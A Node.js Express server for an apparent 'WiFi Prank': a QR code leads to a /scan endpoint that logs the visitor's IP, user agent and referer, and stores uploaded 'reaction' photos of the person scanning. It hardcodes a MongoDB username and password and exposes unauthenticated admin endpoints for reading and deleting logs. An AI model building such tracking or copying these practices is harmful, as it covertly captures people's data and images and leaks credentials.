const express = require('express');
const QRCode = require('qrcode');
const fs = require('fs');
const path = require('path');
const { v4: uuidv4 } = require('uuid');
const multer = require('multer');
const mongoose = require('mongoose');

const app = express();
const PORT = process.env.PORT || 3000;
const UPLOADS_DIR = path.join(__dirname, 'public', 'uploads');

// MongoDB Connection
const MONGO_URI = 'mongodb+srv://yuvam123:yuvam123@cluster0.xgmjbky.mongodb.net/employee-mgmt?appName=Cluster0';
mongoose.connect(MONGO_URI, { useNewUrlParser: true, useUnifiedTopology: true })
  .then(() => console.log('✅ Connected to MongoDB'))
  .catch(err => console.error('❌ MongoDB Connection Error:', err));

// MongoDB Schema
const ScanLogSchema = new mongoose.Schema({
  scanId: { type: String, required: true },
  timestamp: { type: Date, default: Date.now },
  ip: String,
  userAgent: String,
  referer: String,
  reaction: String,
  brightness: Number
});
const ScanLog = mongoose.model('ScanLog', ScanLogSchema);

// Ensure uploads directory exists on startup
if (!fs.existsSync(UPLOADS_DIR)) {
  fs.mkdirSync(UPLOADS_DIR, { recursive: true });
}

// Setup multer for image processing
const storage = multer.diskStorage({
  destination: (req, file, cb) => cb(null, UPLOADS_DIR),
  filename: (req, file, cb) => cb(null, `reaction-${uuidv4()}.jpg`)
});
const upload = multer({ storage });

app.use(express.json({ limit: '90mb' }));
app.use(express.static(path.join(__dirname, 'public')));

// Redirect root to admin.html
app.get('/', (req, res) => {
  res.redirect('/admin.html');
});

// ─── Scan endpoint (what the QR code points to) ───────────────────────────
app.get('/scan', async (req, res) => {
  const ip =
    req.headers['x-forwarded-for']?.split(',')[0].trim() ||
    req.socket.remoteAddress ||
    'Unknown';

  const scanId = uuidv4();
  
  try {
    await ScanLog.create({
      scanId,
      ip,
      userAgent: req.headers['user-agent'] || 'Unknown',
      referer: req.headers['referer'] || 'Direct Scan'
    });
    console.log(`[Scan] New scan detected from IP: ${ip} (ID: ${scanId})`);
    res.redirect(`/reveal.html?scanId=${scanId}`);
  } catch (err) {
    console.error('Error creating scan log:', err);
    res.status(500).send('Internal Server Error');
  }
});

// ─── API: Upload reaction photo ──────────────────────────────────────────
app.post('/api/upload-reaction', upload.single('reaction'), async (req, res) => {
  const { scanId } = req.body;
  console.log(`[Upload] Received reaction for scanId: ${scanId}`);
  
  if (!scanId || !req.file) {
    console.error(`[Upload Failed] Missing data. scanId: ${scanId}, file: ${req.file ? 'Yes' : 'No'}`);
    return res.status(400).json({ error: 'Missing scanId or file' });
  }

  try {
    const updated = await ScanLog.findOneAndUpdate(
      { scanId },
      { 
        reaction: `/uploads/${req.file.filename}`,
        brightness: req.body.brightness || 0
      },
      { new: true }
    );
    
    if (updated) {
      console.log(`[Upload Success] Saved to MongoDB: ${updated.reaction}`);
      res.json({ ok: true });
    } else {
      console.error(`[Upload Failed] scanId ${scanId} not found in database.`);
      res.status(404).json({ error: 'Scan log not found' });
    }
  } catch (err) {
    console.error('Error updating reaction:', err);
    res.status(500).json({ error: 'Database update failed' });
  }
});

// ─── API: get scan logs ────────────────────────────────────────────────────
app.get('/api/logs', async (req, res) => {
  console.log(`[Logs] Admin fetched scan logs`);
  try {
    const logs = await ScanLog.find().sort({ timestamp: -1 });
    res.json(logs);
  } catch (err) {
    console.error('Error fetching logs:', err);
    res.status(500).json({ error: 'Failed to fetch logs' });
  }
});

// ─── API: clear logs ───────────────────────────────────────────────────────
app.delete('/api/logs', async (req, res) => {
  console.log(`[Logs] Clearing all logs...`);
  try {
    await ScanLog.deleteMany({});
    res.json({ ok: true });
  } catch (err) {
    res.status(500).json({ error: 'Failed to clear logs' });
  }
});

// ─── API: generate QR code as data URL ────────────────────────────────────
app.get('/api/qrcode', async (req, res) => {
  const baseUrl = req.query.url || `https://${req.hostname}`;
  const scanUrl = `${baseUrl.replace(/\/$/, '')}/scan`;
  console.log(`[QR] Generating code for: ${scanUrl}`);

  try {
    const qrDataUrl = await QRCode.toDataURL(scanUrl, {
      errorCorrectionLevel: 'H',
      width: 400,
      margin: 2,
      color: { dark: '#1a1a2e', light: '#ffffff' },
    });
    res.json({ qr: qrDataUrl, url: scanUrl });
  } catch (err) {
    console.error(`[QR Error] ${err.message}`);
    res.status(500).json({ error: err.message });
  }
});

// ─── Start ─────────────────────────────────────────────────────────────────
app.listen(PORT, () => {
  console.log(`\n🚀 WiFi Prank Server running!`);
  console.log(`   Admin dashboard : http://localhost:${PORT}/admin.html`);
  console.log(`   Scan landing    : http://localhost:${PORT}/scan`);
  console.log(`\n💡 To share publicly, run: npx ngrok http ${PORT}\n`);
});
